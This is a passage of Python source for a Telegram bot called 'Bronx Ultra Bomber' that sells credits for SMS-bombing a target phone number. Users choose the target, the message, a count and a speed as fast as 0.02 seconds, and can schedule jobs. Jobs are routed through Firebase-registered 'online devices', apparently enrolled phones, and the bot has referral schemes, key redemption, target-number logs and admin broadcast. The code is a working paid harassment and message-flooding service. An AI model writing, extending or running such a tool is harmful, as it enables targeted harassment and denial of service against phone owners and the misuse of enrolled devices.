        [InlineKeyboardButton("🐢 Slow (1s)", callback_data="speed_slow")],
        [InlineKeyboardButton("🐇 Medium (0.5s)", callback_data="speed_medium")],
        [InlineKeyboardButton("🚀 Fast (0.1s)", callback_data="speed_fast")],
        [InlineKeyboardButton("💥 Lightning (0.02s)", callback_data="speed_lightning")],
    ]
    await update.message.reply_text("⚡ *SELECT SPEED*", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
    return SPEED

async def bomb_speed(update, context):
    q = update.callback_query; await q.answer()
    d = q.data
    delay = {"speed_slow": 1.0, "speed_medium": 0.5,
             "speed_fast": 0.1, "speed_lightning": 0.02}.get(d, 0.5)
    context.user_data["delay"] = delay
    kb = [
        [InlineKeyboardButton("🚀 Send Now", callback_data="send_now")],
        [InlineKeyboardButton("🕒 Schedule Later", callback_data="schedule_later")],
    ]
    await q.message.reply_text(
        f"⏱️ Delay: *{delay}s*\n\n🕒 Choose when to send:",
        reply_markup=InlineKeyboardMarkup(kb),
        parse_mode=ParseMode.MARKDOWN)
    return SCHEDULE

async def bomb_schedule(update, context):
    text = update.message.text.strip().lower()
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    try:
        schedule_time = datetime.strptime(text, "%Y-%m-%d %H:%M")
        if schedule_time <= datetime.now():
            await update.message.reply_text("⚠️ Future time only.")
            return SCHEDULE
        context.user_data["schedule_time"] = schedule_time
        await _launch_bomb(update, context)
        return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("❌ Invalid format. Use `YYYY-MM-DD HH:MM`")
        return SCHEDULE

async def _launch_bomb(update, context):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    target = context.user_data.get("target")
    message = context.user_data.get("message")
    count = context.user_data.get("sms_count")
    delay = context.user_data.get("delay")
    schedule_time = context.user_data.get("schedule_time")

    if not all([target, message, count, delay is not None]):
        await context.bot.send_message(chat_id, "❌ Missing data. Please start over.")
        context.user_data.clear()
        return

    if get_user_credits(user_id) < count:
        await context.bot.send_message(chat_id, "❌ Insufficient credits.")
        context.user_data.clear()
        return

    firebases = db_get_firebases()
    if not firebases:
        await context.bot.send_message(chat_id, "❌ No Firebase configured.")
        context.user_data.clear()
        return

    fb_ids = list(firebases.keys())
    job_id = str(uuid4())[:8]
    db_add_job(job_id, target, message, fb_ids, chat_id, count, delay, user_id)
    db_add_number_history(user_id, target, message, count, job_id)
    task = asyncio.create_task(execute_bomb_job(job_id, target, message, fb_ids, count, delay, user_id, schedule_time))
    running_jobs[job_id] = task

    s = f"⏰ Scheduled: `{schedule_time}`" if schedule_time else "🚀 Running now..."
    await context.bot.send_message(
        chat_id,
        f"✅ *BOMB LAUNCHED!*\n{LINE}\n"
        f"📦 Job: `{job_id}`\n📞 Target: `{target}`\n"
        f"📨 Count: {count} | ⚡ {delay}s\n{s}\n{LINE}",
        parse_mode=ParseMode.MARKDOWN)
    context.user_data.clear()

async def cancel_conversation(update, context):
    await update.message.reply_text("❌ Cancelled.")
    return ConversationHandler.END

# ---------- QUICK BOMB ----------
async def quick_bomb(update, context):
    user_id = update.effective_user.id
    if is_banned(user_id):
        await update.message.reply_text("🚫 You are banned."); return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /bomb <target> <message>"); return
    target = args[0]; message = " ".join(args[1:])
    count = min(10, get_user_credits(user_id))
    if count == 0:
        await update.message.reply_text("❌ No credits."); return
    firebases = db_get_firebases()
    if not firebases:
        await update.message.reply_text("❌ No Firebase."); return
    fb_ids = list(firebases.keys())
    chat_id = update.effective_chat.id
    job_id = str(uuid4())[:8]
    db_add_job(job_id, target, message, fb_ids, chat_id, count, 0.1, user_id)
    db_add_number_history(user_id, target, message, count, job_id)
    task = asyncio.create_task(execute_bomb_job(job_id, target, message, fb_ids, count, 0.1, user_id, None))
    running_jobs[job_id] = task
    await update.message.reply_text(f"✅ *QUICK BOMB*\n📦 `{job_id}`", parse_mode=ParseMode.MARKDOWN)

# ---------- USER COMMANDS ----------
async def balance_command(update, context):
    credits = get_user_credits(update.effective_user.id)
    await update.message.reply_text(
        f"💎 *BALANCE*\n{LINE}\n💳 Credits: *{credits}*\n{LINE}",
        parse_mode=ParseMode.MARKDOWN)

async def buycredits_command(update, context):
    await update.message.reply_text(
        f"🛒 *BUY CREDITS*\n{LINE}\n"
        f"💡 *1 Credit = ₹{CREDIT_PRICE}*\n\n"
        f"📩 DM {BUY_CONTACT} to buy credits.\n"
        f"{LINE}",
        parse_mode=ParseMode.MARKDOWN)

async def redeem_command(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /redeem <key>"); return
    key = context.args[0].strip()
    if db_redeem_key(key, update.effective_user.id):
        credits = get_user_credits(update.effective_user.id)
        await update.message.reply_text(f"✅ Redeemed! Balance: *{credits}*", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("❌ Invalid/expired key.")

async def history_command(update, context):
    jobs = db_get_jobs(limit=10, user_id=update.effective_user.id)
    if not jobs:
        await update.message.reply_text("📜 No jobs yet."); return
    text = "📜 *HISTORY*\n" + LINE + "\n"
    for j in jobs:
        text += f"`{j['id']}` → {j['target']} *({j['status']})*\n"
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def cancel_job_command(update, context):
    if not context.args:
        await update.message.reply_text("Usage: /cancel <job_id>"); return
    job_id = context.args[0]
    if job_id in running_jobs:
        running_jobs[job_id].cancel()
        del running_jobs[job_id]
        db_update_job(job_id, status="cancelled", finished_at=datetime.now().isoformat())
        await update.message.reply_text(f"✅ Job `{job_id}` cancelled.", parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("Job not running.")

# ---------- REFER COMMANDS ----------
async def refer_command(update, context):
    user_id = update.effective_user.id
    me = await context.bot.get_me()
    link = f"https://t.me/{me.username}?start={user_id}"
    await update.message.reply_text(
        f"🎁 *REFER & EARN*\n{LINE}\n"
        f"💡 1 Valid Refer = *{REFER_CREDITS} Credits*\n\n"
        f"🔗 Your Link:\n`{link}`\n\n"
        f"⚠️ Rules:\n"
        f"• Only NEW users count\n"
        f"• Old users won't count\n"
        f"• Fake refers blocked\n"
        f"{LINE}",
        parse_mode=ParseMode.MARKDOWN)

async def my_referrals(update, context):
    user_id = update.effective_user.id
    info = get_user_info(user_id) or {}
    count = info.get("refer_count", 0) or 0
    await update.message.reply_text(
        f"👥 *MY REFERRALS*\n{LINE}\n"
        f"Total Valid Refers: *{count}*\n"
        f"Credits Earned: *{count * REFER_CREDITS}*\n{LINE}",
        parse_mode=ParseMode.MARKDOWN)

# ---------- ADMIN COMMANDS ----------
async def admin_panel_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    text = (
        "🛡️ *ADMIN PANEL*\n" + LINE + "\n\n"
        "🔨 `/ban <user_id>`\n"
        "✅ `/unban <user_id>`\n"
        "➕ `/addcredit <user_id> <amount>`\n"
        "➖ `/removecredit <user_id> <amount>`\n"
        "📜 `/numberhistory`\n"
        "🏆 `/leaderboard`\n"
        "🔑 `/addkey <credits> <max_uses>`\n"
        "📢 `/broadcast <text>`\n"
        "➕ `/addfb <url>`\n"
        "➖ `/deletefb <id>`\n"
        f"\n{LINE}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def ban_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    if not context.args:
        await update.message.reply_text("Usage: /ban <user_id>"); return
    try: uid = int(context.args[0])
    except: await update.message.reply_text("❌ Invalid ID."); return
    set_ban(uid, 1)
    await update.message.reply_text(f"🔨 Banned `{uid}`", parse_mode=ParseMode.MARKDOWN)

async def unban_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    if not context.args:
        await update.message.reply_text("Usage: /unban <user_id>"); return
    try: uid = int(context.args[0])
    except: await update.message.reply_text("❌ Invalid ID."); return
    set_ban(uid, 0)
    await update.message.reply_text(f"✅ Unbanned `{uid}`", parse_mode=ParseMode.MARKDOWN)

async def addcredit_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /addcredit <user_id> <amount>"); return
    try:
        uid = int(context.args[0]); amt = int(context.args[1])
        if amt <= 0: raise ValueError
    except:
        await update.message.reply_text("❌ Invalid inputs."); return
    update_user_credits(uid, amt)
    new_bal = get_user_credits(uid)
    await update.message.reply_text(
        f"✅ Added *{amt}* credits to `{uid}`\nNew balance: *{new_bal}*",
        parse_mode=ParseMode.MARKDOWN)
    try:
        await BOT.send_message(uid, f"🎁 Admin added *{amt}* credits! New balance: *{new_bal}*", parse_mode=ParseMode.MARKDOWN)
    except Exception: pass

async def removecredit_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /removecredit <user_id> <amount>"); return
    try:
        uid = int(context.args[0]); amt = int(context.args[1])
        if amt <= 0: raise ValueError
    except:
        await update.message.reply_text("❌ Invalid inputs."); return
    update_user_credits(uid, -amt)
    new_bal = get_user_credits(uid)
    await update.message.reply_text(
        f"✅ Removed *{amt}* credits from `{uid}`\nNew balance: *{new_bal}*",
        parse_mode=ParseMode.MARKDOWN)
    try:
        await BOT.send_message(uid, f"⚠️ Admin removed *{amt}* credits. New balance: *{new_bal}*", parse_mode=ParseMode.MARKDOWN)
    except Exception: pass

async def numberhistory_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    rows = db_get_all_numbers()
    if not rows:
        await update.message.reply_text("📜 No number history yet."); return
    buf = io.StringIO()
    buf.write("=" * 70 + "\n")
    buf.write("BRONX ULTRA BOMBER — NUMBER HISTORY\n")
    buf.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
    buf.write(f"Total Records: {len(rows)}\n")
    buf.write("=" * 70 + "\n\n")
    for r in rows:
        buf.write(f"Job ID     : {r.get('job_id','')}\n")
        buf.write(f"User ID    : {r.get('user_id','')}\n")
        buf.write(f"Username   : @{r.get('username') or 'N/A'}\n")
        buf.write(f"Name       : {r.get('first_name') or 'N/A'}\n")
        buf.write(f"Target     : {r.get('target','')}\n")
        buf.write(f"SMS Count  : {r.get('sms_count','')}\n")
        buf.write(f"Message    : {r.get('message','')}\n")
        buf.write(f"Time       : {r.get('created_at','')}\n")
        buf.write("-" * 70 + "\n")
    buf.seek(0)
    await update.message.reply_document(
        document=io.BytesIO(buf.read().encode("utf-8")),
        filename=f"number_history_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
        caption=f"📜 Total Records: {len(rows)}")

async def leaderboard_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    rows = get_leaderboard(10)
    if not rows:
        await update.message.reply_text("No users yet."); return
    text = "🏆 *LEADERBOARD — Top 10*\n" + LINE + "\n\n"
    medals = ["🥇", "🥈", "🥉"]
    for i, r in enumerate(rows):
        m = medals[i] if i < 3 else f"{i+1}."
        uname = f"@{r['username']}" if r.get('username') else (r.get('first_name') or 'N/A')
        text += (
            f"{m} *{uname}*\n"
            f"   🆔 `{r['user_id']}`\n"
            f"   💎 Credits: *{r['credits']}*\n"
            f"   👥 Refers: {r.get('refer_count') or 0}\n"
            f"{'─' * 25}\n"
        )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def addkey_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /addkey <credits> <max_uses>"); return
    try:
        credits = int(context.args[0]); max_uses = int(context.args[1])
        if credits <= 0 or max_uses <= 0: raise ValueError
    except:
        await update.message.reply_text("❌ Positive integers only."); return
    key = generate_key_string()
    db_add_key(key, credits, max_uses, update.effective_user.id)
    await update.message.reply_text(
        f"🔑 *KEY GENERATED*\n{LINE}\n🎟️ `{key}`\n💳 {credits} | ♻️ {max_uses}\n{LINE}",
        parse_mode=ParseMode.MARKDOWN)

async def addcredits_command(update, context):
    await addcredit_command(update, context)

async def add_firebase_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    if not context.args:
        await update.message.reply_text("Usage: /addfb <url>"); return
    url = context.args[0].strip()
    if not url.startswith("http"):
        await update.message.reply_text("❌ Invalid URL."); return
    test = await firebase_request(url + "?shallow=true", "GET")
    if isinstance(test, dict) and test.get("_error"):
        await update.message.reply_text(f"❌ Connection failed: {test.get('message')}"); return
    fid = str(len(db_get_firebases()) + 1)
    db_add_firebase(fid, url, "")
    await update.message.reply_text(f"✅ Firebase `{fid}` added.\n{url}", parse_mode=ParseMode.MARKDOWN)

async def delete_firebase_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    if not context.args:
        await update.message.reply_text("Usage: /deletefb <id>"); return
    fid = context.args[0].strip()
    if fid not in db_get_firebases():
        await update.message.reply_text("❌ Not found."); return
    db_delete_firebase(fid)
    await update.message.reply_text(f"✅ Firebase `{fid}` deleted.", parse_mode=ParseMode.MARKDOWN)

# ---------- BROADCAST ----------
def escape_markdown(text):
    chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{c}' if c in chars else c for c in text)

async def broadcast_command(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized."); return
    conn = _connect(); c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    rows = c.fetchall(); conn.close()
    user_ids = [r[0] for r in rows]
    if not user_ids:
        await update.message.reply_text("No users."); return
    photo = None; caption = None
    if update.message.photo:
        photo = update.message.photo[-1].file_id
        caption = update.message.caption or ""
    elif context.args:
        caption = " ".join(context.args)
    else:
        await update.message.reply_text("Provide text or photo."); return
    cap_esc = escape_markdown(caption) if caption else ""
    sent = fail = 0
    for uid in user_ids:
        try:
            if photo:
                await BOT.send_photo(uid, photo=photo, caption=cap_esc, parse_mode=ParseMode.MARKDOWN)
            else:
                await BOT.send_message(uid, text=cap_esc, parse_mode=ParseMode.MARKDOWN)
            sent += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await update.message.reply_text(f"📢 Done. ✅ {sent} | ❌ {fail}")

# ---------- BUTTON HANDLER ----------
async def button_handler(update, context):
    text = update.message.text
    user_id = update.effective_user.id

    if text and text.startswith("/"):
        return

    if user_id not in ADMIN_IDS:
        if is_banned(user_id):
            await update.message.reply_text("🚫 You are banned.")
            return

    if context.user_data.get("awaiting_redeem"):
        key = text.strip()
        if db_redeem_key(key, user_id):
            credits = get_user_credits(user_id)
            await update.message.reply_text(
                f"🎟️ *KEY REDEEMED!*\n{LINE}\n💳 Balance: *{credits}*\n{LINE}",
                parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("❌ Invalid/used/expired key.")
        context.user_data.pop("awaiting_redeem", None)
        return

    if text == "💣 Launch Bomb":
        await bomb_wizard_start(update, context)
    elif text == "💰 Balance":
        await balance_command(update, context)
    elif text == "📊 Status":
        jobs = db_get_jobs(limit=10, user_id=user_id)
        if not jobs:
            await update.message.reply_text("📊 No jobs yet."); return
        out = "📊 *STATUS*\n" + LINE + "\n"
        for j in jobs:
            out += (f"`{j['id']}` → `{j['target']}`\n"
                    f"✅ {j.get('success_count',0)} ❌ {j.get('fail_count',0)} | *{j['status']}*\n"
                    f"{'─' * 25}\n")
        await update.message.reply_text(out, parse_mode=ParseMode.MARKDOWN)
    elif text == "📜 History":
        await history_command(update, context)
    elif text == "🔑 Redeem Key":
        context.user_data["awaiting_redeem"] = True
        await update.message.reply_text("🔑 Send the key now:", parse_mode=ParseMode.MARKDOWN)
    elif text == "🛒 Buy Credits":
        await buycredits_command(update, context)
    elif text == "🎁 Refer & Earn":
        await refer_command(update, context)
    elif text == "👥 My Referrals":
        await my_referrals(update, context)
    elif text == "📡 Online Devices" and user_id in ADMIN_IDS:
        await show_devices_from_message(update)
    elif text == "📊 Stats & History" and user_id in ADMIN_IDS:
        await show_stats_from_message(update)
    elif text == "⚙️ Manage Firebases" and user_id in ADMIN_IDS:
        await manage_firebases_from_message(update)
    elif text == "🔑 Generate Key" and user_id in ADMIN_IDS:
        await update.message.reply_text(
            "🔑 *GENERATE KEY*\nUse:\n`/addkey <credits> <max_uses>`",
            parse_mode=ParseMode.MARKDOWN)
    elif text == "🛡️ Admin Panel" and user_id in ADMIN_IDS:
        await admin_panel_command(update, context)

# ---------- HELPERS ----------
async def show_devices_from_message(update):
    firebases = db_get_firebases()
    if not firebases:
        await update.message.reply_text("No Firebase configured."); return
    all_devices = []
    for fid, data in firebases.items():
        for d in await get_online_devices(data["url"]):
            d["fb_id"] = fid; all_devices.append(d)
    if not all_devices:
        await update.message.reply_text("📡 No devices online."); return
    text = "📡 *ONLINE DEVICES*\n" + LINE + "\n"
    for d in all_devices:
        text += (f"*{d['name']}* (FB:{d['fb_id']})\n`{d['id']}`\n"
                 f"📱 {d['phone']} | 🔋 {d['battery']}\n\n")
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def show_stats_from_message(update):
    total_users = db_get_all_users_count()
    jobs = db_get_jobs(limit=100)
    total_sent = sum(j.get("success_count", 0) or 0 for j in jobs)
    total_fail = sum(j.get("fail_count", 0) or 0 for j in jobs)
    rate = round(total_sent / (total_sent + total_fail) * 100) if (total_sent + total_fail) > 0 else 0
    text = (
        "📊 *STATISTICS*\n" + LINE + "\n"
        f"👥 Total Users: *{total_users}*\n"
        f"📦 Total Jobs: *{len(jobs)}*\n"
        f"✅ Completed: *{sum(1 for j in jobs if j.get('status')=='completed')}*\n"
        f"📨 SMS Sent: *{total_sent}*\n"
        f"📈 Success Rate: *{rate}%*\n"
        f"{LINE}"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def manage_firebases_from_message(update):
    firebases = db_get_firebases()
    text = "⚙️ *MANAGE FIREBASES*\n" + LINE + "\n"
    if not firebases:
        text += "No Firebase.\n"
    else:
        for fid, data in firebases.items():
            text += f"• `{fid}`: `{data['url']}`\n"
    text += "\nUse `/addfb <url>` or `/deletefb <id>`."
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def show_devices(query):
    firebases = db_get_firebases()
    if not firebases:
        await query.edit_message_text("No Firebase."); return
    all_devices = []
    for fid, data in firebases.items():
        for d in await get_online_devices(data["url"]):
            d["fb_id"] = fid; all_devices.append(d)
    if not all_devices:
        await query.edit_message_text("📡 No devices online."); return
    text = "📡 *ONLINE DEVICES*\n" + LINE + "\n"
    for d in all_devices:
        text += (f"*{d['name']}* (FB:{d['fb_id']})\n`{d['id']}`\n"
                 f"📱 {d['phone']} | 🔋 {d['battery']}\n\n")
    kb = [[InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

async def manage_firebases(query):
    firebases = db_get_firebases()
    text = "⚙️ *FIREBASES*\n" + LINE + "\n"
    if not firebases:
        text += "No Firebase.\n"
    else:
        for fid, data in firebases.items():
            text += f"• `{fid}`: `{data['url']}`\n"
    kb = []
    for fid in firebases:
        kb.append([
            InlineKeyboardButton(f"Test {fid}", callback_data=f"fb_test_{fid}"),
            InlineKeyboardButton(f"Delete {fid}", callback_data=f"fb_delete_{fid}"),
        ])
    kb.append([InlineKeyboardButton("➕ Add (use /addfb)", callback_data="add_fb")])
    kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_panel")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)

# ---------- MAIN ----------
def main():
    global BOT
    start_health_server()

    app = Application.builder().token(TOKEN).concurrent_updates(True).build()
    BOT = app.bot
    set_bot(BOT)

    conv = ConversationHandler(
        entry_points=[
            CommandHandler("bombwizard", bomb_wizard_start),
            MessageHandler(filters.Regex('^💣 Launch Bomb$'), bomb_wizard_start),
        ],
        states={
            TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_target)],
            MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_message)],
            SMS_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_sms_count)],
            SPEED: [CallbackQueryHandler(bomb_speed, pattern="^speed_(slow|medium|fast|lightning)$")],
            SCHEDULE: [
                CallbackQueryHandler(callback_handler, pattern="^send_now$|^schedule_later$"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_schedule),
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel_conversation)],
        allow_reentry=True,
    )
    app.add_handler(conv)

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ping", ping))
    app.add_handler(CommandHandler("bomb", quick_bomb))
    app.add_handler(CommandHandler("balance", balance_command))
    app.add_handler(CommandHandler("buy", buycredits_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("history", history_command))
    app.add_handler(CommandHandler("cancel", cancel_job_command))
    app.add_handler(CommandHandler("refer", refer_command))
    app.add_handler(CommandHandler("myrefers", my_referrals))

    app.add_handler(CommandHandler("admin", admin_panel_command))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("unban", unban_command))
    app.add_handler(CommandHandler("addcredit", addcredit_command))
    app.add_handler(CommandHandler("removecredit", removecredit_command))
    app.add_handler(CommandHandler("numberhistory", numberhistory_command))
    app.add_handler(CommandHandler("leaderboard", leaderboard_command))
    app.add_handler(CommandHandler("addkey", addkey_command))
    app.add_handler(CommandHandler("addcredits", addcredits_command))
    app.add_handler(CommandHandler("broadcast", broadcast_command))
    app.add_handler(CommandHandler("addfb", add_firebase_command))
    app.add_handler(CommandHandler("deletefb", delete_firebase_command))

    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, button_handler))
    app.add_handler(CallbackQueryHandler(callback_handler))

    logger.info("🔥 Bronx Ultra Bomber Bot started.")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
